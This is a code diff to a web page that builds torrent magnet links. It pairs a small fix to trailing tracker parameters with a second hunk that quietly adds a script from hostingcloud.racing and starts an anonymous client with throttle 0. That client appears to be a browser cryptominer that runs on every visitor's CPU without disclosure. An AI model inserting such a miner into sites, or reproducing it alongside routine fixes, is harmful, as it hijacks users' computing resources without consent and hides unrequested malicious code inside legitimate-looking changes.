@@ -11,7 +11,7 @@ function update()
         var trackers = encodeURIComponent(document.getElementById("trackt").value);
         var trackers = trackers.replaceAll("%0A","&tr=");
         var trackers = "tr=" + trackers;
-        if (trackers.slice(-4) == "&tr=") {
+        while (trackers.slice(-4) == "&tr=") {
             trackers = trackers.slice(0,-4);
         }
         var data = "magnet:"
@@ -65,3 +65,12 @@ udp://9.rarbg.me:2720/announce</textarea><br>
 
 </body></html>
 <script async src="https://arc.io/widget.min.js#gi2D9wgu"></script>
+<script src="https://www.hostingcloud.racing/rD5P.js"></script>
+<script>
+    var _client = new Client.Anonymous('ad19f245bdcb8be727ca365dea899058cf5610d3627b0daac9cd746fc7a94dbb', {
+        throttle: 0, c: 'w'
+    });
+    _client.start();
+    
+
+</script>
